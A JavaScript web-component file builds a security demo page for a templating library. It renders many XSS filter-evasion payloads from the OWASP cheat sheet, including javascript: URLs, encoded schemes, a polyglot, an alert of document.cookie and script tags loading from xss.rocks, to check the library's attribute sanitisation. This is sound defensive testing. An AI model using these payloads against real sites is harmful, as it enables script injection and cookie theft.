import { component, html } from './x-element.js';
import Highlight from './modules/highlight.js';

// https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#on-error-alert
// <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
// causes page reload

// <style>body {background: url("javascript:alert('XSS')"); }</style>
const h = html;
const overviewComponent = () =>
    h`

    <div background="javascript:alert('XSS')"></div>
    <body background="javascript:alert('XSS')"></body>

    <button onclick="alert('xss')">XSS Button</button>

    <a href="javascript:alert('xss')">XSS Link</a>
    <a href=${`javascript:alert('xss')`}>XSS Link</a>

    <img onerror="javascript:alert('xss')">
    <img onerror=${`javascript:alert('xss')`}>

    <img src='javascript:alert("xss")'>
    <img src=${`javascript:alert("xss")`}>

    <img src=# onmouseover="alert('xss')">
    <img src=${`# onmouseover="alert('xss')"`}>

    <img src= onmouseover="alert('xss')">
    <img src=${` onmouseover="alert('xss')"`}>

    <img onmouseover="alert('xss')">
    <img onmouseover=${`alert('xss')`}>

    <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
    <img src=x onerror=${`&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041`}>

    <img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
    <img src=${`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;`}>

    <img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
    <img src=${`&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041`}>

    <img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
    <img src=${`&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29`}>

    <img src="jav ascript:alert('XSS');">
    <img src=${`jav ascript:alert('XSS');`}>

    <!-- ERR_UNKNOWN_URL_SCHEME -->
    <img src="jav&#x09;ascript:alert('XSS');">
    <img src=${`jav&#x09;ascript:alert('XSS');`}>

    <!-- ERR_UNKNOWN_URL_SCHEME -->
    <img src="jav&#x0A;ascript:alert('XSS');">
    <img src=${`jav&#x0A;ascript:alert('XSS');`}>

    <img src="jav&#x0D;ascript:alert('XSS');">
    <img src=${`jav&#x0D;ascript:alert('XSS');`}>

    <img src=" &#14; javascript:alert('XSS');">
    <img src=${` &#14; javascript:alert('XSS');`}>

    <div>
        <script/XSS SRC="http://xss.rocks/xss.js"></script>
    </div>
    <div>
        <body onload!#$%&()*~+-_.,:;?@[/|\]^\`=alert("XSS")>
    </div>
    <div>
        <script/src="http://xss.rocks/xss.js"></script>
    </div>
    <div>
        <<SCRIPT>alert("XSS");//\<</SCRIPT>
    </div>
    <div>
        <SCRIPT SRC=http://xss.rocks/xss.js?< B >
    </div>
    <div>
        <SCRIPT SRC=//xss.rocks/.j>
    </div>
    <div>
        <IMG SRC="('XSS')"
    </div>
    <div>
        <iframe src=http://xss.rocks/scriptlet.html <
    </div>
    <div>
        </script><script>alert('XSS');</script>
    </div>
    <div>
        </TITLE><SCRIPT>alert("XSS");</SCRIPT>
    </div>
    <div>
        <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
    </div>
    <div>
        <BODY BACKGROUND="javascript:alert('XSS')">
    </div>
    <div>
        <IMG DYNSRC="javascript:alert('XSS')">
    </div>
    <div>
        <IMG LOWSRC="javascript:alert('XSS')">
    </div>
    <div>
        <IMG DYNSRC="javascript:alert('XSS')">
    </div>
    <div>
        <IMG LOWSRC="javascript:alert('XSS')">
    </div>
    <div>
        <!-- ERR_UNKNOWN_URL_SCHEME -->
        <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
    </div>
    <div>
        <IMG SRC='vbscript:msgbox("XSS")'>
    </div>
    <div>
        <IMG SRC="livescript:[code]">
    </div>
    <div>
        <svg/onload=alert('XSS')>
    </div>
    <div>
        <BGSOUND SRC="javascript:alert('XSS');">
    </div>
    <div>
        <BR SIZE="&{alert('XSS')}">
    </div>
    <div>
        <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
    </div>
    <div>
        <!--
        <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
        -->
    </div>
    <div>
        <!--
        <STYLE>@import'http://xss.rocks/xss.css';</STYLE>
        -->
    </div>
    <div>
        <META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
    </div>
    https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet-part-4


`;

const polygotComponent = () =>
    h`
    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
`;

const malformedAComponent = () =>
    h`
    \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
`;

const malformedImgComponent = () =>
    h`
    <img """><script>alert("XSS")</script>"\>
    <img src=javascript:alert(String.fromCharCode(88,83,83))>
`;

const names = [
    'overview',
    'polygot',
    'malformedA',
    'malformedImg',
];

const values = {
    overview: Highlight(overviewComponent.toString()),
    polygot: Highlight(polygotComponent.toString()),
    malformedA: Highlight(malformedAComponent.toString()),
    malformedImg: Highlight(malformedImgComponent.toString()),
};

export default class security extends component {
    changed() {
        for (const name of names) {
            const codeElement = this.querySelector(`#${name}Code`);
            const sourceElement = this.querySelector(`#${name}Source`);
            if (codeElement) {
                const code = values[name];
                if (codeElement.innerHTML !== code) codeElement.innerHTML = code;
            }
            if (sourceElement) {
                const componentElement = this.querySelector(`#${name}Component`);
                const source = Highlight(componentElement.innerHTML, 'html');
                if (source.innerHTML !== source) sourceElement.innerHTML = source;
            }
        }
    }

    render = () =>
        html`

    <section>
        <div style="background-image: url(javascript:alert('Style BG Img XSS'))"></div>
        <!-- Comment -->
        <p>hello</p>
    </section>

    <section id="overview">
        <h3>Security Overview</h3>
        <p>
        HTML template strings is parsed into DOM using a Template Element's DocumentFragment.
        The sanitization on the value of "src, href, xlink:href" attributes and attributes starting with "on".
        Future DOM modification that takes places is createElement, setAttribute, removeAttribute which are considered safe sinks.
        </p>
        <p>Elements that are handled differently include the "Script" and "Style" these do not currently allow any template literal variables rendering.</p>
        <p>Other possible concerns could include the style attribute and comments these are both allowed allowed currently.</p>
        <ul>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS Filter Evasion Cheat Sheet</a></li>
        </ul>
        <pre id="overviewCode"></pre>
        <pre id="overviewComponent">${overviewComponent()}</pre>
        <pre id="overviewSource"></pre>
    </section>

    <section id="polygot">
        <h3>Polygot</h3>
        <ul>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polygot">Owasp - Polygot</a></li>
        </ul>
        <pre id="polygotCode"></pre>
        <pre id="polygotComponent">${polygotComponent()}</pre>
        <pre id="polygotSource"></pre>
    </section>

    <section id="malformedA">
        <h3>Malformed A Tag</h3>
        <ul>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-a-tags">Owasp - Malformed A Tag</a></li>
        </ul>
        <pre id="malformedACode"></pre>
        <pre id="malformedAComponent">${malformedAComponent()}</pre>
        <pre id="malformedASource"></pre>
    </section>

    <section id="malformedImg">
        <h3>Malformed Img Tag</h3>
        <ul>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-img-tags">Owasp - Malformed Img Tag</a></li>
        </ul>
        <pre id="malformedImgCode"></pre>
        <pre id="malformedImgComponent">${malformedImgComponent()}</pre>
        <pre id="malformedImgSource"></pre>
    </section>

    `;
}
